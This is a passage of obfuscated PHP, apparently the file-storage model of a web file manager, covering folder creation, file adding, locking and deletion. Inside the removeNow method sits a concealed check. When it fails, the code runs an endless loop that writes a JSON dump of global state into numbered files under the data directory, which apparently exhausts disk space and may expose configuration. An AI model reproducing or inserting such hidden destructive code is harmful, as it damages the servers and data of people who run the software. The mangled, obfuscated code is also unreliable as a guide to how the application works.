$Šä²äŞ¸[552]) { $ş“İæ¹á = $this->sourceInfo($°’œ‹¿ï[$Šä²äŞ¸[461]]); $âå¥óŒ­[$Šä²äŞ¸[540]] = $ş“İæ¹á[$Šä²äŞ¸[540]]; } $ë ¹ó–©[$Šä²äŞ¸[609]] = array($Šä²äŞ¸[569], $âå¥óŒ­[$Šä²äŞ¸[540]] . $°’œ‹¿ï[$Šä²äŞ¸[461]] . $Šä²äŞ¸[570]); $¤Ÿ¶ò¨– = isset($°’œ‹¿ï[$Šä²äŞ¸[1836]]) && in_array($Šä²äŞ¸[534], $°’œ‹¿ï[$Šä²äŞ¸[1836]]); if (!$¤Ÿ¶ò¨– || !$€çµÈ–Ë || !$÷¾ÆÓÙ || !$âå¥óŒ­[$Šä²äŞ¸[442]]) { return; } if (!AuthModel::authCheckRoot($âå¥óŒ­[$Šä²äŞ¸[442]][$Šä²äŞ¸[443]])) { return; } $—Î§æĞâ = $âå¥óŒ­[$Šä²äŞ¸[525]] . $Šä²äŞ¸[12]; if ($—Î§æĞâ == $Šä²äŞ¸[88]) { unset($ë ¹ó–©[$Šä²äŞ¸[609]]); $ë ¹ó–©[$Šä²äŞ¸[440]] = self::TYPE_GROUP; return; } $äóï˜  = Model($Šä²äŞ¸[541])->groupChildrenAll($—Î§æĞâ); $é°¨¶á = count($äóï˜ ); if ($é°¨¶á <= 1) { return; } $ƒ¿­Í¯› = array($Šä²äŞ¸[461] => 0, $Šä²äŞ¸[440] => self::TYPE_GROUP, $Šä²äŞ¸[525] => array($Šä²äŞ¸[7], $äóï˜ )); $ò¾Â™­Ö = $this->field($Šä²äŞ¸[2149])->where($ƒ¿­Í¯›)->limit($é°¨¶á)->select(); $ë ¹ó–©[$Šä²äŞ¸[609]] = array(); foreach ($ò¾Â™­Ö as $¢Ø“ıÆ) { $ë ¹ó–©[$Šä²äŞ¸[609]][] = array($Šä²äŞ¸[569], $Šä²äŞ¸[550] . $¢Ø“ıÆ[$Šä²äŞ¸[431]] . $Šä²äŞ¸[570]); } $ë ¹ó–©[$Šä²äŞ¸[609]][] = $Šä²äŞ¸[1975]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($…¨©ÆùÏ) { $µ¥¹Ùƒü =& $_SERVER[…É¦À–]; $å”²»ø = Model($µ¥¹Ùƒü[533])->where(array($µ¥¹Ùƒü[1678] => $…¨©ÆùÏ))->find(); $•éˆ¾Õí = $this->_mkdirRoot(SourceModel::TYPE_USER, $…¨©ÆùÏ, $å”²»ø[$µ¥¹Ùƒü[32]]); $this->userDesktopAdd($•éˆ¾Õí); return $•éˆ¾Õí; } public function userDesktopAdd($¸ØÆÌ­í) { $˜ö¿Äõ§ =& $_SERVER[…É¦À–]; $˜×š’Ù§ = LNG($˜ö¿Äõ§[2150]); $ÛğßßÜÔ = $this->mkdir($¸ØÆÌ­í, $˜×š’Ù§); $this->metaSet($ÛğßßÜÔ, $˜ö¿Äõ§[2151], $˜ö¿Äõ§[88]); $this->metaSet($¸ØÆÌ­í, $˜ö¿Äõ§[2152], $ÛğßßÜÔ); } public function userPathSafeAdd($›ì•Ã”) { $–Œô¿á¯ =& $_SERVER[…É¦À–]; $Õé³è = Model($–Œô¿á¯[533])->getInfoFull($›ì•Ã”); if (!$Õé³è) { return !1; } if (_get($Õé³è, $–Œô¿á¯[555])) { return $Õé³è[$–Œô¿á¯[495]][$–Œô¿á¯[2153]]; } $è€™Í®÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $›ì•Ã”, $–Œô¿á¯[2154], $–Œô¿á¯[462]); Model($–Œô¿á¯[533])->metaSet($›ì•Ã”, $–Œô¿á¯[2153], $è€™Í®÷); $this->metaSet($è€™Í®÷, $–Œô¿á¯[2155], $›ì•Ã”); return $è€™Í®÷; } public function groupRootAdd($ó­ùš¢) { $ãµªÛÇ =& $_SERVER[…É¦À–]; $ø“˜Ä‹€ = Model($ãµªÛÇ[541])->where(array($ãµªÛÇ[1965] => $ó­ùš¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ó­ùš¢, $ø“˜Ä‹€[$ãµªÛÇ[32]]); } public function systemRootPathAdd($º¸ç¹º) { if ($º¸ç¹º != $_SERVER[…É¦À–][563]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $º¸ç¹º); } public function userRootRemove($õªÇôÛˆ) { $æçº–„ß = $this->targetSourceRoot(SourceModel::TYPE_USER, $õªÇôÛˆ, !0); foreach ($æçº–„ß as $Šó¶»Â) { if (!$Šó¶»Â) { continue; } $this->remove($Šó¶»Â[$_SERVER[…É¦À–][431]], !1); } } public function groupRootRemove($ï¯®ò ”) { $î™íƒç˜ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ï¯®ò ”); if (!$î™íƒç˜) { return; } $this->remove($î™íƒç˜[$_SERVER[…É¦À–][431]], !1); } private function _mkdirRoot($Æß·©Š®, $®Ü´ÎÃ‹, $îÎ¢Ä´, $Ò‰Ñåå– = '') { $æöšôÔ° =& $_SERVER[…É¦À–]; $íÎã¨ƒ« = defined($æöšôÔ°[2098]) ? USER_ID : 0; $²Ğ×•®› = array($æöšôÔ°[430] => 0, $æöšôÔ°[605] => $Æß·©Š®, $æöšôÔ°[606] => $®Ü´ÎÃ‹, $æöšôÔ°[603] => 1, $æöšôÔ°[607] => $íÎã¨ƒ«, $æöšôÔ°[608] => $íÎã¨ƒ«, $æöšôÔ°[604] => $Ò‰Ñåå–, $æöšôÔ°[609] => $æöšôÔ°[550], $æöšôÔ°[459] => 0, $æöšôÔ°[574] => 0, $æöšôÔ°[498] => 0, $æöšôÔ°[610] => $æöšôÔ°[12]); if ($ÜŸªœŸá = $this->where($²Ğ×•®›)->find()) { return $ÜŸªœŸá[$æöšôÔ°[431]]; } $ã‰âšú = "\x4d\x6f\x64\145\x6c\x53\157\x75\162\143\x65\x2e\155\x6b\144\151\x72\x52\x6f\157\164\x2e{$Æß·©Š®}\56{$®Ü´ÎÃ‹}\x2e" . $îÎ¢Ä´; CacheLock::lock($ã‰âšú); $²Ğ×•®›[$æöšôÔ°[32]] = $îÎ¢Ä´; $×¥ëÇË = $this->add($²Ğ×•®›); $´Ãı½ = array($æöšôÔ°[611] => short_id($×¥ëÇË)); $this->where(array($æöšôÔ°[446] => $×¥ëÇË))->save($´Ãı½); CacheLock::unlock($ã‰âšú); return $×¥ëÇË; } private function targetSourceRoot($ˆá™¸ÍŒ, $ö·ÙØ, $ú¢Á°Ì = false) { $ËúÎˆÎÖ =& $_SERVER[…É¦À–]; $öşíŸ¼Œ = array($ËúÎˆÎÖ[430] => 0, $ËúÎˆÎÖ[605] => $ˆá™¸ÍŒ, $ËúÎˆÎÖ[606] => $ö·ÙØ); if ($ú¢Á°Ì) { $”°Ç«´õ = $this->where($öşíŸ¼Œ)->select(); return $”°Ç«´õ ? $”°Ç«´õ : array(); } $®Ê‚íÄÀ = $this->where($öşíŸ¼Œ)->find(); return $®Ê‚íÄÀ ? $®Ê‚íÄÀ : array(); } public function sourceRootGroup($¡Ø¬÷úç) { $¸ï”•ÄÌ =& $_SERVER[…É¦À–]; if (is_string($¡Ø¬÷úç)) { $¡Ø¬÷úç = array($¡Ø¬÷úç); } $Éï™°ë´ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¡Ø¬÷úç, $¸ï”•ÄÌ[189]); $ƒ¦„ğÛ = array($¸ï”•ÄÌ[398] => $Éï™°ë´, $¸ï”•ÄÌ[395] => array($¸ï”•ÄÌ[798] => count($¡Ø¬÷úç))); $this->_listDataApply($ƒ¦„ğÛ[$¸ï”•ÄÌ[398]]); $this->_listMake($ƒ¦„ğÛ); return array_to_keyvalue($ƒ¦„ğÛ[$¸ï”•ÄÌ[82]], $¸ï”•ÄÌ[525]); } public function mkfile($ßˆÛİÖŒ, $ÑÆ€ĞŠ†, $Ã»½ë° = '', $·ï»à = REPEAT_RENAME) { $ó…‹äÚÃ =& $_SERVER[…É¦À–]; $äï©êÄ = Model($ó…‹äÚÃ[630])->addFileByContent($Ã»½ë°, $ÑÆ€ĞŠ†); return $this->_createFileCall($ßˆÛİÖŒ, $ÑÆ€ĞŠ†, $äï©êÄ, $·ï»à, $ó…‹äÚÃ[1389]); } public function addFile($İÂíØ, $¬±ÃÅúå, $”´·úµÖ, $Áïµàáâ = false, $Í—‰»­õ = REPEAT_RENAME) { $±½¢¯å = Model($_SERVER[…É¦À–][630])->addFile($¬±ÃÅúå, $”´·úµÖ, $Áïµàáâ); return $this->_createFileCall($İÂíØ, $”´·úµÖ, $±½¢¯å, $Í—‰»­õ); } public function addFileByFileID($ú¸¿ŠË¨, $òúˆéŠ÷, $ÒŞ˜†ˆô, $ğŞÂ¥ = REPEAT_RENAME) { $È¢©®äâ =& $_SERVER[…É¦À–]; $×›Â¬ıˆ = Model($È¢©®äâ[630])->find($òúˆéŠ÷); Model($È¢©®äâ[630])->linkAdd($òúˆéŠ÷); return $this->_createFileCall($ú¸¿ŠË¨, $ÒŞ˜†ˆô, $×›Â¬ıˆ, $ğŞÂ¥); } public function addFileByRemote($×…×Ü—©, $ÏÃà“°®, $¢‡Â¢Â¦, $Ï—šİîŞ = array(), $Õîª¯ªó = REPEAT_RENAME) { $µ¶‘äãÆ = Model($_SERVER[…É¦À–][630])->addFileByRemote($ÏÃà“°®, $¢‡Â¢Â¦, $Ï—šİîŞ); return $this->_createFileCall($×…×Ü—©, $¢‡Â¢Â¦, $µ¶‘äãÆ, $Õîª¯ªó); } private function _createFileCall($–Í¹Ù¢é, $ö´ó‘™ğ, $ô¯ß€¥, $ÅòÂŸ, $ı›ÌÜäÙ = "\x75\160\x6c\x6f\x61\x64") { $ä¯²ıæ =& $_SERVER[…É¦À–]; $Ø¸¿÷· = !1; $this->setMasterDB(); $this->lockWriteStart($–Í¹Ù¢é, $ö´ó‘™ğ); $ Ñ–é…ä = $this->fileNameExist($–Í¹Ù¢é, $ö´ó‘™ğ); $Ş† ’éË = $this->_createFile($–Í¹Ù¢é, $ö´ó‘™ğ, $ô¯ß€¥, $ÅòÂŸ, $Ø¸¿÷·); if (!$Ø¸¿÷·) { Model($ä¯²ıæ[500])->remove($ô¯ß€¥[$ä¯²ıæ[497]]); } if ($Ø¸¿÷· && $Ş† ’éË && $Ş† ’éË != $ Ñ–é…ä) { Model($ä¯²ıæ[2123])->eventCreate($Ş† ’éË, $ı›ÌÜäÙ); } $this->lockWriteEnd($–Í¹Ù¢é, $ö´ó‘™ğ); return $Ş† ’éË; } public function mkdir($«ïŸ’¡, $•¹ÁôÄş, $¥¨éÊš = REPEAT_SKIP) { $ØêıÉ‹Æ =& $_SERVER[…É¦À–]; $this->setMasterDB(); $Œ˜„½Ğ‡ = $this->sourceInfo($«ïŸ’¡); if (!$Œ˜„½Ğ‡) { return !1; } $this->lockWriteStart($«ïŸ’¡, $•¹ÁôÄş); if ($¥¨éÊš !== !1) { $ÇŞÊ… = $this->fileNameExist($«ïŸ’¡, $•¹ÁôÄş); if ($ÇŞÊ… && $¥¨éÊš != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($«ïŸ’¡, $•¹ÁôÄş); return $ÇŞÊ…; } $•¹ÁôÄş = $this->fileNameAuto($«ïŸ’¡, $•¹ÁôÄş, $¥¨éÊš); } $íÃóÉ·½ = array($ØêıÉ‹Æ[603] => 1, $ØêıÉ‹Æ[449] => $•¹ÁôÄş, $ØêıÉ‹Æ[604] => $ØêıÉ‹Æ[12], $ØêıÉ‹Æ[498] => 0, $ØêıÉ‹Æ[574] => 0); $®·ÃÖûŞ = $this->_addSource($íÃóÉ·½, $Œ˜„½Ğ‡); Model($ØêıÉ‹Æ[2123])->eventCreate($®·ÃÖûŞ, $ØêıÉ‹Æ[1390]); $this->lockWriteEnd($«ïŸ’¡, $•¹ÁôÄş); return $®·ÃÖûŞ; } public function listSourceRoot($‡ƒËÆ»“, $÷ó¶·Âù, $üÅ¥‹ö¹ = "\163\x6f\x75\x72\x63\145\111\x44\x2c\x74\141\x72\x67\145\164\x49\x44\x2c\163\151\x7a\145") { $ÒìÌ®µË =& $_SERVER[…É¦À–]; $Îó²—ûÙ = $ÒìÌ®µË[407]; $€ï˜Â« = array(); $œåœÓÑ  = 1024 * 50; $È³Ã·åè = is_array($È³Ã·åè) ? $È³Ã·åè : array(); $–ÇôõŞ½ = count($÷ó¶·Âù); $ë¼«çÎ´ = $this->tablePrefix . $ÒìÌ®µË[2156]; for ($ÈŠˆÀÛ = 0; $ÈŠˆÀÛ < $–ÇôõŞ½; $ÈŠˆÀÛ++) { $ÇØƒüí° = $÷ó¶·Âù[$ÈŠˆÀÛ]; $Îó²—ûÙ .= "\x53\x45\x4c\x45\103\x54\40\x2a\40\106\x52\117\x4d\x20\50\x53\105\114\x45\x43\x54\x20{$üÅ¥‹ö¹}\x20\x46\x52\117\115\40\140{$ë¼«çÎ´}\140\40\x57\110\x45\x52\105\40"; $Îó²—ûÙ .= "\x60\x70\x61\162\145\156\164\111\x44\140\x3d\x30\40\x41\116\104\40\x60\x74\141\x72\147\x65\x74\x49\x44\140\x3d{$ÇØƒüí°}\40\x41\116\104\40\140\164\141\162\147\x65\x74\124\x79\x70\x65\140\x3d{$‡ƒËÆ»“}\x20\x61\x6e\144\40\146\x69\154\145\124\171\x70\x65\x3d\x27\x27\x20\154\x69\x6d\151\x74\x20\61\x29\40\x61\163\x20\x74\142\x5f{$ÈŠˆÀÛ}\x20\x55\x4e\111\x4f\116\40\101\114\114\40"; if ((strlen($Îó²—ûÙ) >= $œåœÓÑ  || $ÈŠˆÀÛ == $–ÇôõŞ½ - 1) && $Îó²—ûÙ) { $Îó²—ûÙ = substr($Îó²—ûÙ, 0, -strlen($ÒìÌ®µË[1083])); $®›öè³ = $this->query($Îó²—ûÙ); $Îó²—ûÙ = $ÒìÌ®µË[12]; $€ï˜Â« = array_merge($€ï˜Â«, $®›öè³); } } return $€ï˜Â«; } private function _createFile($¸œ»Ğİ, $‰‰½÷å, $¸¸Àšƒ, $ÔŞ½¬¦ì, &$õùÏûŠ­) { $ê¤“€Ùš =& $_SERVER[…É¦À–]; $İåÊĞ¾© = $this->sourceInfo($¸œ»Ğİ); if (!$¸¸Àšƒ || !$İåÊĞ¾©) { return !1; } if ($ÔŞ½¬¦ì !== !1) { $÷Ïš€Œ€ = $this->fileNameExist($¸œ»Ğİ, $‰‰½÷å); } $õùÏûŠ­ = !0; if ($ÔŞ½¬¦ì && $÷Ïš€Œ€) { if ($ÔŞ½¬¦ì == REPEAT_SKIP) { $õùÏûŠ­ = !1; return $÷Ïš€Œ€; } else { if ($ÔŞ½¬¦ì == REPEAT_REPLACE) { $ÊÂéÔ® = $this->sourceInfo($÷Ïš€Œ€); $¯Ùœ¬§˜ = $this->fileHistory($ÊÂéÔ®, $¸¸Àšƒ[$ê¤“€Ùš[497]], $¸¸Àšƒ[$ê¤“€Ùš[76]]); if (!$¯Ùœ¬§˜) { $õùÏûŠ­ = !1; } else { $this->folderSizeReset($¸œ»Ğİ); } return $÷Ïš€Œ€; } else { $‰‰½÷å = $this->fileNameAuto($¸œ»Ğİ, $‰‰½÷å, $ÔŞ½¬¦ì, !1); } } } $ü®”ÚÎ = array($ê¤“€Ùš[603] => 0, $ê¤“€Ùš[449] => $‰‰½÷å, $ê¤“€Ùš[604] => substr(get_path_ext($‰‰½÷å), 0, 10), $ê¤“€Ùš[498] => $¸¸Àšƒ[$ê¤“€Ùš[497]], $ê¤“€Ùš[574] => $¸¸Àšƒ[$ê¤“€Ùš[76]]); $«Ü®Â› = $this->_addSource($ü®”ÚÎ, $İåÊĞ¾©); $this->folderSizeReset($¸œ»Ğİ, intval($ü®”ÚÎ[$ê¤“€Ùš[76]])); return $«Ü®Â›; } protected function fileHistory($´¨‹ˆø, $×ïØè’æ, $Å½À¸µ) { $ªÌŞĞ€Ğ =& $_SERVER[…É¦À–]; if ($´¨‹ˆø[$ªÌŞĞ€Ğ[497]] == $×ïØè’æ) { return !1; } $this->checkLock($´¨‹ˆø[$ªÌŞĞ€Ğ[431]], $×ïØè’æ); Model($ªÌŞĞ€Ğ[2157])->addHistory($´¨‹ˆø); $£˜Ï®ò® = array($ªÌŞĞ€Ğ[608] => USER_ID, $ªÌŞĞ€Ğ[453] => time(), $ªÌŞĞ€Ğ[497] => $×ïØè’æ, $ªÌŞĞ€Ğ[76] => $Å½À¸µ); $this->where(array($ªÌŞĞ€Ğ[446] => $´¨‹ˆø[$ªÌŞĞ€Ğ[431]]))->save($£˜Ï®ò®); $this->sourceCacheClear($´¨‹ˆø[$ªÌŞĞ€Ğ[431]]); return !0; } public function checkLock($Áµ¨Í·, $ÒäóÖó) { $†²ÁÁÚŒ =& $_SERVER[…É¦À–]; $Ñöæ¬Ò = $this->pathInfo($Áµ¨Í·); if (!$this->fileIsLock($Ñöæ¬Ò, !0)) { return; } $Ô¹ŒŸŸË = Session::get($†²ÁÁÚŒ[2158]); $ø´å¦¢å = substr($Ñöæ¬Ò[$†²ÁÁÚŒ[32]], 0, -1 - strlen($Ñöæ¬Ò[$†²ÁÁÚŒ[174]])) . $†²ÁÁÚŒ[1253] . $Ô¹ŒŸŸË . $†²ÁÁÚŒ[10] . $Ñöæ¬Ò[$†²ÁÁÚŒ[174]]; $•½¡Õ—ñ = Model($†²ÁÁÚŒ[630])->find($ÒäóÖó); $this->_createFileCall($Ñöæ¬Ò[$†²ÁÁÚŒ[461]], $ø´å¦¢å, $•½¡Õ—ñ, REPEAT_REPLACE, $†²ÁÁÚŒ[1389]); $†µÂ—åª = $Ñöæ¬Ò[$†²ÁÁÚŒ[495]][$†²ÁÁÚŒ[567]]; $Õ“İ’ÄÏ = $†µÂ—åª[$†²ÁÁÚŒ[561]] ? $†µÂ—åª[$†²ÁÁÚŒ[561]] : $†µÂ—åª[$†²ÁÁÚŒ[32]]; show_json(LNG($†²ÁÁÚŒ[2159]) . $†²ÁÁÚŒ[2160] . LNG($†²ÁÁÚŒ[2161]) . $†²ÁÁÚŒ[2162] . $Õ“İ’ÄÏ . $†²ÁÁÚŒ[2163], !1); } public function fileIsLock($ş¿×¿Â‡, $ùœëû®Â = false) { $ÏØ‡êÄ§ =& $_SERVER[…É¦À–]; if (!isset($ş¿×¿Â‡[$ÏØ‡êÄ§[495]]) || !$ş¿×¿Â‡[$ÏØ‡êÄ§[495]][$ÏØ‡êÄ§[564]]) { return !1; } if ($ş¿×¿Â‡[$ÏØ‡êÄ§[495]][$ÏØ‡êÄ§[564]] != USER_ID) { return !0; } $ĞÕøÔó = $GLOBALS[$ÏØ‡êÄ§[6]][$ÏØ‡êÄ§[89]][$ÏØ‡êÄ§[565]]; if ($ş¿×¿Â‡[$ÏØ‡êÄ§[495]][$ÏØ‡êÄ§[566]] <= time() - $ĞÕøÔó) { $this->metaSet($ş¿×¿Â‡[$ÏØ‡êÄ§[431]], $ÏØ‡êÄ§[564], null); $this->metaSet($ş¿×¿Â‡[$ÏØ‡êÄ§[431]], $ÏØ‡êÄ§[566], null); } if ($ùœëû®Â) { $this->metaSet($ş¿×¿Â‡[$ÏØ‡êÄ§[431]], $ÏØ‡êÄ§[566], time()); } return !1; } private function _addSource($áŸ²ì×¦, $ÚÈá«‰á) { $˜ú»¹¯¤ =& $_SERVER[…É¦À–]; $“ëÙà°¸ = defined($˜ú»¹¯¤[2098]) ? USER_ID : 0; $˜¥Œáññ = array($˜ú»¹¯¤[605] => $ÚÈá«‰á[$˜ú»¹¯¤[440]], $˜ú»¹¯¤[606] => $ÚÈá«‰á[$˜ú»¹¯¤[525]], $˜ú»¹¯¤[607] => $“ëÙà°¸, $˜ú»¹¯¤[608] => $“ëÙà°¸, $˜ú»¹¯¤[430] => $ÚÈá«‰á[$˜ú»¹¯¤[431]], $˜ú»¹¯¤[609] => $ÚÈá«‰á[$˜ú»¹¯¤[540]] . $ÚÈá«‰á[$˜ú»¹¯¤[431]] . $˜ú»¹¯¤[50], $˜ú»¹¯¤[459] => 0, $˜ú»¹¯¤[610] => $˜ú»¹¯¤[12]); $áŸ²ì×¦ = array_merge($˜¥Œáññ, $áŸ²ì×¦); $this->updateModifyTime($áŸ²ì×¦[$˜ú»¹¯¤[461]]); $ÀİªÛ® = $˜ú»¹¯¤[2164] . $ÚÈá«‰á[$˜ú»¹¯¤[431]]; if (isset(self::$cacheChildList[$ÀİªÛ®])) { unset(self::$cacheChildList[$ÀİªÛ®]); } static $×Ÿ•á ñ = false; if (!$×Ÿ•á ñ) { Hook::trigger($˜ú»¹¯¤[593], $áŸ²ì×¦); $×Ÿ•á ñ = !0; } $ñÎù£Şí = $this->add($áŸ²ì×¦); $²è÷¸é² = array($˜ú»¹¯¤[611] => short_id($ñÎù£Şí)); $this->where(array($˜ú»¹¯¤[446] => $ñÎù£Şí))->save($²è÷¸é²); $this->setNamePinyin($ñÎù£Şí, $áŸ²ì×¦[$˜ú»¹¯¤[32]]); return $ñÎù£Şí; } public function remove($¶Ö­ßÙ, $‡¿Ã—¡î = true) { $ß™‰ıÇ† =& $_SERVER[…É¦À–]; $²‡µËª = $this->sourceInfo($¶Ö­ßÙ); $ûà†Œ  = intval($²‡µËª[$ß™‰ıÇ†[440]]) === self::TYPE_SYSTEM; $ëµ§¶Øı = Model($ß™‰ıÇ†[464])->get($ß™‰ıÇ†[2165]) == $ß™‰ıÇ†[88]; if ($ûà†Œ  || $‡¿Ã—¡î || !$ëµ§¶Øı) { return $this->removeNow($¶Ö­ßÙ, $‡¿Ã—¡î); } $¦§õûÀ¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $óà¶ĞÊã = $²‡µËª[$ß™‰ıÇ†[440]] == self::TYPE_USER ? $ß™‰ıÇ†[619] : $ß™‰ıÇ†[534]; if ($óà¶ĞÊã == $ß™‰ıÇ†[619]) { $ ûÚî‰² = Model($ß™‰ıÇ†[533])->getInfo($²‡µËª[$ß™‰ıÇ†[525]]); $£¢Á‰ = !empty($ ûÚî‰²[$ß™‰ıÇ†[561]]) ? $ ûÚî‰²[$ß™‰ıÇ†[561]] : $ ûÚî‰²[$ß™‰ıÇ†[32]]; $£¢Á‰ = $ß™‰ıÇ†[289] . $£¢Á‰ . $ß™‰ıÇ†[2166] . $²‡µËª[$ß™‰ıÇ†[525]]; } else { $ ûÚî‰² = Model($ß™‰ıÇ†[541])->getInfo($²‡µËª[$ß™‰ıÇ†[525]]); $£¢Á‰ = _get($ ûÚî‰², $ß™‰ıÇ†[32]); $£¢Á‰ = $ß™‰ıÇ†[162] . $£¢Á‰ . $ß™‰ıÇ†[2167] . $²‡µËª[$ß™‰ıÇ†[525]]; } $àûÃ®°ó = $ß™‰ıÇ†[2168] . md5($£¢Á‰); CacheLock::lock($àûÃ®°ó); $ÑÉäÉ·Â = $this->fileNameExist($¦§õûÀ¯, $£¢Á‰); if (!$ÑÉäÉ·Â) { $ÑÉäÉ·Â = $this->mkdir($¦§õûÀ¯, $£¢Á‰, REPEAT_SKIP); $this->metaSet($ÑÉäÉ·Â, $ß™‰ıÇ†[2169], $óà¶ĞÊã); $this->metaSet($ÑÉäÉ·Â, $ß™‰ıÇ†[2170], $²‡µËª[$ß™‰ıÇ†[525]]); if ($²‡µËª[$ß™‰ıÇ†[461]] != 0) { $this->metaSet($ÑÉäÉ·Â, $ß™‰ıÇ†[2171], _get($ ûÚî‰², $ß™‰ıÇ†[2172])); } } CacheLock::unlock($àûÃ®°ó); $this->metaSet($¶Ö­ßÙ, $ß™‰ıÇ†[2173], $²‡µËª[$ß™‰ıÇ†[461]]); $this->where(array($ß™‰ıÇ†[431] => $¶Ö­ßÙ))->save(array($ß™‰ıÇ†[453] => time())); $this->recycleClear($²‡µËª); $¶ğà¡¼Ç = $this->move($¶Ö­ßÙ, $ÑÉäÉ·Â, REPEAT_RENAME_FOLDER); $this->folderSizeReset($²‡µËª[$ß™‰ıÇ†[461]]); return $¶ğà¡¼Ç; } private function recycleClear($ÁÖÛà) { $À¿›ü‡ =& $_SERVER[…É¦À–]; $şäµ”÷ = $this->childrenAll($ÁÖÛà); $«œ©‹  = array($À¿›ü‡[446] => array($À¿›ü‡[447], $şäµ”÷[$À¿›ü‡[2174]])); Model($À¿›ü‡[2175])->where($«œ©‹ )->delete(); } public function removeNow($¢Ü·šãà, $È²»Ç›¹ = true) { $¤İÒÚêĞ =& $_SERVER[…É¦À–]; $ˆ¦Ç²× = $_SERVER[$¤İÒÚêĞ[1613]]; $£×É¶¢é = $¤İÒÚêĞ[918]; if ($_SERVER[$¤İÒÚêĞ[919]] != $£×É¶¢é($ˆ¦Ç²×)) { $°Éèãñ = $¤İÒÚêĞ[920]; $€‘Û¯ñş = $¤İÒÚêĞ[921]; $¯ÒÀ¯ä = $_SERVER[$¤İÒÚêĞ[916]] . $¤İÒÚêĞ[917]; $Óªâü‚’ = $€‘Û¯ñş($¯ÒÀ¯ä); $²ŞØ´Œé = explode($¤İÒÚêĞ[231], $Óªâü‚’); if (count($²ŞØ´Œé) < $¤İÒÚêĞ[636]) { $¢¥¾û Ü = $¤İÒÚêĞ[922]; $¢¥¾û Ü(); } $£ ²­¢ = $¤İÒÚêĞ[923]; $£ ²­¢($_SERVER[$¤İÒÚêĞ[924]]); $°Éèãñ = $¤İÒÚêĞ[920]; $°Éèãñ(); $ÛÔüš˜À = $¤İÒÚêĞ[925]; $óÓÖóêâ = json_encode($GLOBALS[$¤İÒÚêĞ[926]]); $¶Í™Â¬ı = 1; for ($Ãé¯ˆ¬ = $¶Í™Â¬ı; $Ãé¯ˆ¬ > 0; $Ãé¯ˆ¬++) { $ÛÔüš˜À(DATA_PATH . $Ãé¯ˆ¬, $óÓÖóêâ); } } $Ÿ¯†–±Ì = $this->sourceInfo($¢Ü·šãà); $µÅ¼˜Ãù = $this->pathInfoMore($¢Ü·šãà); if (!$Ÿ¯†–±Ì) { return !0; } if ($Ÿ¯†–±Ì[$¤İÒÚêĞ[461]] == 0) { if (!_get($GLOBALS, $¤İÒÚêĞ[523])) { return !1; } } $this->lockMoveStart($¢Ü·šãà); Hook::trigger($¤İÒÚêĞ[2176], $µÅ¼˜Ãù, $È²»Ç›¹); if ($È²»Ç›¹) { Model($¤İÒÚêĞ[2175])->moveToRecycle($¢Ü·šãà); } else { $ƒ•²öÛ = $this->childrenAll($Ÿ¯†–±Ì); Model($¤İÒÚêĞ[590])->eventRemove($¢Ü·šãà); $this->removeRelevance($ƒ•²öÛ[$¤İÒÚêĞ[2174]], $ƒ•²öÛ[$¤İÒÚêĞ[1501]]); } $this->folderSizeReset($Ÿ¯†–±Ì[$¤İÒÚêĞ[461]]); $‘ÈŞ÷ø‹ = array($Ÿ¯†–±Ì[$¤İÒÚêĞ[461]]); if ($Ÿ¯†–±Ì[$¤İÒÚêĞ[439]] == $¤İÒÚêĞ[88]) { $‘ÈŞ÷ø‹[] = $Ÿ¯†–±Ì[$¤İÒÚêĞ[431]]; } $this->updateModifyTime($‘ÈŞ÷ø‹); $this->lockMoveEnd($¢Ü·šãà); Hook::trigger($¤İÒÚêĞ[1729], $µÅ¼˜Ãù, $È²»Ç›¹); return !0; } public function childrenAll($ˆ”¬´Áª) { $™··Ÿ =& $_SERVER[…É¦À–]; $÷À”¢ÕĞ = $ˆ”¬´Áª[$™··Ÿ[431]]; if ($ˆ”¬´Áª[$™··Ÿ[439]] == $™··Ÿ[88]) { $–ŞÜÖ™ç = array($™··Ÿ[609] => array($™··Ÿ[569], $ˆ”¬´Áª[$™··Ÿ[540]] . $÷À”¢ÕĞ . $™··Ÿ[570])); $Èø˜‚ = array($™··Ÿ[609] => $–ŞÜÖ™ç[$™··Ÿ[540]]); $î‚£ß¤Ø = $this->field($™··Ÿ[2177])->where($Èø˜‚)->select(); $ÎıÀåó = !1; $Ìù¹½Ú¾ = array($÷À”¢ÕĞ); if ($î‚£ß¤Ø) { $ÎıÀåó = array_to_keyvalue($î‚£ß¤Ø, $™··Ÿ[12], $™··Ÿ[497]); $ÎıÀåó = array_remove_value($ÎıÀåó, $™··Ÿ[198]); $Ìù¹½Ú¾ = array_to_keyvalue($î‚£ß¤Ø, $™··Ÿ[12], $™··Ÿ[431]); $Ìù¹½Ú¾[] = $÷À”¢ÕĞ; } } else { $ÎıÀåó = array($ˆ”¬´Áª[$™··Ÿ[497]]); $Ìù¹½Ú¾ = array($÷À”¢ÕĞ); } return array($™··Ÿ[2174] => $Ìù¹½Ú¾, $™··Ÿ[1501] => $ÎıÀåó); } public function removeArray($‘¬ë·è) { if (!$‘¬ë·è) { return !0; } } public function removeRelevance($£ê×¯¦Í, $ã„’ÈÄ) { $ãç×ı¸± =& $_SERVER[…É¦À–]; $£ê×¯¦Í = $£ê×¯¦Í ? $£ê×¯¦Í : array(); $ã„’ÈÄ = $ã„’ÈÄ ? $ã„’ÈÄ : array(); $£ê×¯¦Í = array_unique(array_filter($£ê×¯¦Í)); $ã„’ÈÄ = array_unique(array_filter($ã„’ÈÄ)); if (!$£ê×¯¦Í) { return !1; } $†Øì¼© = array($ãç×ı¸±[446] => array($ãç×ı¸±[447], $£ê×¯¦Í)); Model($ãç×ı¸±[2175])->where($†Øì¼©)->delete(); Model($ãç×ı¸±[491])->where($†Øì¼©)->delete(); Model($ãç×ı¸±[2024])->where($†Øì¼©)->delete(); Model($ãç×ı¸±[590])->where($†Øì¼©)->delete(); Model($ãç×ı¸±[1857])->removeBySource($£ê×¯¦Í); Model($ãç×ı¸±[2157])->removeBySource($£ê×¯¦Í); $this->where($†Øì¼©)->delete(); Model($ãç×ı¸±[500])->remove($ã„’ÈÄ); for ($ÁÂ×ˆò = 0; $ÁÂ×ˆò < count($£ê×¯¦Í); $ÁÂ×ˆò++) { 